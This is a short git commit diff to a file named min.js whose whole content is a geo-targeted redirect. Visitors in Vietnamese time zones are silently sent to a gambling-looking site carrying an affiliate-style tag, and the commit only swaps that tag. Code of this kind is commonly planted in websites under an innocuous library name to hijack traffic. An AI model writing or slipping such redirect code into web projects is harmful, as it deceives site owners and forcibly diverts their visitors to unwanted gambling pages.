b006e94691278fd744a8c749779c4329bea398a5
namct888999-lab <namct888999@gmail.com>
2025-11-17 17:06:48 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,6 +1,6 @@
 const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
 if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-  var to = "https://www.jun88nn2.net/?uagt=namct888&path=root";
+  var to = "https://www.jun88nn2.net/?uagt=jun888bet&path=root";
   window.location.href = to;
 }
